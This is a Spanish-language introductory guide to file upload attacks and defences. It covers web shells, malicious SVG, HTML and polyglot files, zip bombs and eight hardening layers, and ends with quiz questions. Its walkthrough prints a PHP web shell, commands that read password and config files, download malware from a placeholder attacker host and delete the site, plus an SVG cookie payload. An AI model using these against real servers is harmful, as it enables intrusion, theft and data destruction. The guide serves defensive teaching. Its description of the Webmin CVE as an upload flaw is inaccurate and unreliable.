---
title: "Subida de Archivos (File Upload): El Caballo de Troya Digital"
level: "inicial"
content_type: "guia"
updated: "2026-06-29"
---

# Subida de Archivos (File Upload): El Caballo de Troya Digital

## Objetivo de esta Guía

Entender por qué darle al usuario el poder de subir archivos a tu servidor es la acción técnica más peligrosa que un programador puede implementar, y como un atacante usa esta función para destruir el sistema desde adentro.

Casi todas las páginas modernas te piden subir algo: una foto de perfil, un currículum en PDF, o un documento de Excel. Cuando haces esto, estas físicamente tomando un archivo de tu computadora y guardándolo permanentemente en el disco duro del servidor de la empresa. Para un hacker, esta es una invitación abierta.

La subida de archivos es peligrosa porque combina múltiples vectores de ataque en una sola funcionalidad. No es solo la "Web Shell" clásica. También puede ser XSS (si el archivo contiene JavaScript que se ejecuta al visualizarse), SSRF (si el servidor procesa el archivo y este contiene URLs), o ataques de denial of service (archivos extremadamente grandes o comprimidos que agotan los recursos del servidor).

## La Analogía: El Caballo de Troya

Imagina que el Servidor Web es un castillo fuertemente protegido. Nadie puede entrar a la sala de control.

El castillo tiene un pequeño buzón de correos donde la gente del pueblo puede meter sus fotos de perfil. El guardia de la puerta toma las fotos y las guarda en el almacén del castillo.

1. El Hacker no intenta romper la puerta.
2. Toma un soldado enemigo (un virus), lo esconde adentro de un caballo de madera, le pone una etiqueta que dice "foto_de_gatito.jpg" y lo empuja por el buzón.
3. El guardia del castillo (un mal programador) solo lee la etiqueta externa, asume que es una foto, y mete el caballo de madera al almacén interno del castillo.
4. A medianoche, el soldado enemigo sale del caballo de madera falso, camina por los pasillos del castillo, roba las llaves maestras y le abre la puerta al ejército atacante.

Esto es exactamente lo que hace una **Web Shell**.

## La Web Shell: El Soldado Enemigo

Una Web Shell es un archivo pequeño de código maligno (generalmente escrito en PHP, Python, ASP, JSP o Perl). Si un atacante logra subir una Web Shell al servidor, y luego "visita" ese archivo a través de su navegador, el atacante obtiene una consola de comandos con los poderes del servidor.

### El Escenario

La página web tiene un formulario: "Sube tu foto de perfil (Solo JPG)".

El hacker crea un archivo maligno llamado `shell.php` con el siguiente contenido:

```php
<?php system($_GET['cmd']); ?>
```

Esta línea le dice al servidor: "Toma lo que venga en el parámetro `cmd` de la URL y ejecutalo como un comando del sistema operativo."

### Paso 1: Evadir las Defensas del Frontend

El programador junior puso una defensa en JavaScript (en el navegador) que dice: "Si el archivo no termina en .jpg, muestra un error."

El atacante usa Burp Suite (un proxy interceptador). En su navegador, sube un archivo real llamado `gato.jpg` para engañar a Chrome. Pero mientras el archivo viaja por el aire en las manos del Mensajero (HTTP), el atacante intercepta el paquete en Burp Suite, le borra la extensión y escribe `.php` con el código maligno adentro.

El servidor trasero recibe el PHP directamente. La defensa del Frontend fue completamente inútil.

### Paso 2: La Ejecución

El servidor guarda el archivo en: `empresa.com/uploads/shell.php`.

El atacante simplemente abre su navegador y entra a esa URL:

```
https://empresa.com/uploads/shell.php?cmd=cat /etc/passwd
```

El servidor "ejecuta" el archivo PHP. La pantalla del atacante muestra el contenido del archivo de contraseñas del servidor Linux.

Con comandos más poderosos:

```
?cmd=ls -la /var/www/html          (listar archivos del sitio)
?cmd=cat /var/www/html/config.php   (leer configuracion con claves de BD)
?cmd=mysql -u root -p'pass' -e "SELECT * FROM usuarios"  (leer BD)
?cmd=wget http://atacante.com/malware -O /tmp/backdoor.php (descargar mas herramientas)
?cmd=rm -rf /var/www/html          (destruir todo el sitio)
```

**Game Over.** El atacante tiene control total del servidor.

## Tipos de Archivos de Ataque

### Web Shells

Son archivos de script (PHP, ASP, JSP, Python, Perl) que permiten ejecutar comandos en el servidor.

Ejemplos famosos de Web Shells:
- **b374k**: Web Shell PHP con editor de archivos, consola, y explorador de base de datos.
- **c99shell**: Otra Web Shell PHP muy conocida.
- **Weevely**: Herramienta de generación de Web Shells con capacidades de evasion.

### Archivos con Contenido Maligno

No solo los scripts ejecutables son peligrosos.

**SVG (Scalable Vector Graphics):** Es un formato de imagen basado en XML que puede contener JavaScript. Si el servidor muestra el SVG como imagen pero no sanitiza su contenido, el JavaScript se ejecuta en el navegador de quien vea la imagen (XSS almacenado).

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

**HTML:** Si el servidor permite subir archivos HTML, el atacante puede subir una página de phishing que imita la página de login del sitio. Cuando otros usuarios visiten esa página, pensaran que es parte del sitio legítimo.

**PDF con JavaScript:** Los PDFs pueden contener JavaScript incrustado. Si el visor de PDF del servidor procesa el JavaScript, puede haber ejecución de código.

**Archivos de Office con Macros:** Los archivos .docm, .xlsm pueden contener macros maliciosas. Si el servidor o algún usuario descarga y abre estos archivos, las macros se ejecutan.

**ZIP Bomba:** Un archivo ZIP pequeño (unos pocos KB) que al descomprimirse ocupa gigabytes o terabytes. Usado para ataques de denial of service contra el servidor o contra los discos.

**Polyglot Files:** Archivos que son validos en dos formatos simultáneamente. Por ejemplo, un GIF que también es un PHP válido. El servidor ve la cabecera GIF (y lo acepta como imagen), pero el interprete PHP ejecuta el código incrustado.

### Sobrescritura de Archivos del Sistema

Si el servidor no valida correctamente la ruta donde se guarda el archivo, el atacante puede usar path traversal para sobrescribir archivos del sistema.

```
Nombre del archivo: ../../etc/cron.d/malware
```

Si el servidor concatena la ruta de subida con el nombre del archivo sin sanitizar, el atacante puede escribir un archivo en cualquier parte del sistema.

## La Defensa en Profundidad

La seguridad en subida de archivos es como una cebolla, necesitas todas las capas.

Subir archivos de forma segura requiere múltiples capas de defensa. Ninguna capa es suficiente por si sola.

### Capa 1: Validación de la Cabecera del Archivo (Magic Bytes)

No confíes en la extensión del archivo. Examina los primeros bytes del archivo (los Magic Bytes) para determinar su tipo real.

| Formato | Magic Bytes (hex) |
|---|---|
| JPEG | `FF D8 FF E0` |
| PNG | `89 50 4E 47` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP | `50 4B 03 04` |

```python
def es_imagen_valida(contenido):
    # Verificar Magic Bytes
    if contenido[:4] == b'\xff\xd8\xff\xe0':  # JPEG
        return True
    if contenido[:8] == b'\x89PNG\r\n\x1a\n':  # PNG
        return True
    return False
```

**Limitacion:** El atacante puede crear un archivo polyglot que tenga Magic Bytes de imagen pero también contenga código PHP. Por eso necesitas capas adicionales.

### Capa 2: Validación de Extensión

Combinada con la validación de Magic Bytes, la extensión debe coincidir con el tipo real.

**Mal:** Solo verificar la extensión.
**Bien:** Verificar la extensión Y los Magic Bytes, y rechazar si no coinciden.

### Capa 3: Renombrar el Archivo

Nunca guardes el archivo con el nombre original del usuario. Genera un nombre aleatorio (UUID, hash) y guárdalo con ese nombre.

**Mal:** `uploads/foto_usuario.jpg`
**Bien:** `uploads/a1b2c3d4-e5f6-7890-abcd-ef1234567890.jpg`

Esto previene:
- Sobrescritura de archivos existentes
- Path traversal en el nombre del archivo
- Que el atacante sepa la URL exacta de su archivo subido

### Capa 4: Almacenar Fuera del Webroot

Los archivos subidos no deben estar en el mismo directorio que el código de la aplicación web.

**Mal:** `/var/www/html/uploads/shell.php` (accesible via `https://sitio.com/uploads/shell.php`)
**Bien:** `/var/data/uploads/a1b2c3d4.jpg` (no accesible directamente por URL)

Si los archivos no están en el webroot, incluso si el atacante sube un PHP, no puede ejecutarlo visitando una URL.

### Capa 5: Servir Archivos a través de un Proxy (sin ejecución)

Cuando el usuario necesita ver o descargar el archivo, sirvelo a través de un script intermediario que lee el archivo y lo entrega como descarga, sin ejecutar nada.

```python
@app.route('/descargar/<id_archivo>')
def descargar_archivo(id_archivo):
    archivo = db.obtener_archivo(id_archivo)
    ruta = os.path.join(UPLOAD_DIR, archivo.nombre_guardado)

    # Servir como descarga, no como ejecucion
    return send_file(ruta, as_attachment=True)
```

### Capa 6: Deshabilitar la Ejecución en el Directorio de Subida

En el servidor web (Apache, Nginx), configura el directorio de subida para que no ejecute scripts.

**Apache (.htaccess):**
```
<Directory "/var/www/uploads">
    Options -ExecCGI
    AddHandler cgi-script .php .pl .py .jsp .asp
    RemoveHandler .php .pl .py .jsp .asp
    php_flag engine off
</Directory>
```

**Nginx:**
```nginx
location /uploads/ {
    location ~ \.php$ {
        return 403;
    }
}
```

Si deshabilitas la ejecución de PHP en el directorio de subida, incluso si el atacante logra subir `shell.php`, el servidor no lo ejecutará. Solo mostrará el contenido como texto plano.

### Capa 7: Almacenamiento Externo (AWS S3, CDN)

No guardes los archivos en el mismo servidor que ejecuta la aplicación. Usa servicios de almacenamiento externo como AWS S3, Google Cloud Storage, o Azure Blob Storage.

**Ventajas:**
- Si el archivo es malicioso, no se ejecuta en tu servidor.
- El almacenamiento externo tiene sus propias políticas de seguridad.
- La autenticación para acceder a los archivos se maneja con URLs firmadas.

### Capa 8: Escaneo de Virus

Integra un antivirus (ClamAV es gratuito y open source) para escanear cada archivo subido antes de guardarlo.

```bash
clamscan archivo_subido
```

Si el archivo contiene malware conocido, el antivirus lo detecta antes de que llegue al servidor.

## Casos Reales de File Upload

**Caso RapidShare (2012):** Un atacante subió un archivo PHP a RapidShare, un servicio de almacenamiento de archivos. El servidor no deshabilitaba la ejecución en el directorio de subida. El atacante ejecutó comandos en el servidor y robo la base de datos completa de usuarios.

**Caso Webmin (2019):** Una vulnerabilidad de subida de archivos en Webmin (una herramienta de administración de servidores) permitió a atacantes ejecutar código remoto sin autenticación. La vulnerabilidad (CVE-2019-15107) permitia subir un archivo malicioso que se ejecutaba en el servidor.

**Caso WordPress (multiple):** Los plugins de WordPress para subir archivos (contact forms, galerias, etc.) han sido vectores de ataque recurrentes. En 2020, un plugin de contacto popular tenía una vulnerabilidad que permitia subir archivos PHP sin restricciones.

## Modos de Falla con Subida de Archivos

**Confiar solo en la extensión.** Un archivo llamado `imagen.jpg` puede contener código PHP. Los Magic Bytes son la única forma confiable de determinar el tipo.

**Confiar solo en el Content-Type.** El header `Content-Type: image/jpeg` puede ser falsificado por el atacante con Burp Suite.

**Permitir ejecución en /uploads.** Es el error más común. El directorio donde se guardan los archivos subidos no debe tener permisos de ejecución.

**No limitar el tamaño del archivo.** Un atacante puede subir un archivo de varios gigabytes, llenando el disco duro del servidor (Denial of Service).

**No limitar el número de archivos.** Un atacante puede subir miles de archivos pequeños, agotando los inodos del sistema de archivos.

**No validar el contenido de archivos comprimidos.** Un ZIP puede contener un archivo PHP malicioso. El servidor debe escanear el contenido del ZIP antes de descomprimirlo.

**Procesar archivos sin sandbox.** Si el servidor procesa el archivo (convierte imágenes, extrae texto de PDFs), el procesamiento debe hacerse en un entorno aislado (sandbox) para evitar que un archivo malicioso explote vulnerabilidades en el procesador.

## Autoevaluación

1. Por qué es un error fatal de diseño programar las validaciones de "Subida Segura de Archivos" exclusivamente en el código Frontend (JavaScript) del navegador del usuario, en lugar del Backend?

2. Lograste subir una Web Shell (archivo malicioso en PHP) exitosamente al servidor de una universidad en la ruta `/imagenes/shell.php`. Sin embargo, al visitar la URL en tu navegador, la página no ejecuta los comandos, solo te muestra el código fuente en texto plano. Que regla de "Hardening" configuró correctamente el Blue Team en esa carpeta?

3. Para engañar al filtro de extensiones del servidor, un atacante decide nombrar a su archivo `virus.php.jpg`. Explica como podría este "Doble Nombre" llegar a confundir al sistema operativo si esta mal configurado.

4. Por qué cambiar el nombre del archivo del usuario a un valor aleatorio complejo (Ej. de `foto.png` a `a2b4c6...png`) ayuda a prevenir que una Web Shell se active?

5. Explica el concepto de "Polyglot File" y como un atacante podría crear un archivo que sea simultáneamente un GIF válido y un script PHP válido.

6. Tu aplicación web permite a los usuarios subir imágenes en formato SVG. Explica por qué los SVGs son peligrosos incluso si el servidor los sirve como "imágenes" y no como "scripts".

7. Un equipo de desarrollo almacena los archivos subidos en un bucket S3 de AWS y usa URLs firmadas (pre-signed URLs) para servir los archivos. Que ventajas de seguridad tiene esta arquitectura comparada con almacenar los archivos en el servidor web?

8. Durante una auditoría, encuentras que un sitio permite la subida de archivos pero no tiene límite de tamaño. Un atacante decide subir un archivo ZIP de 1KB que al descomprimirse ocupa 10GB. Como se llama este ataque y como lo mitigarias?
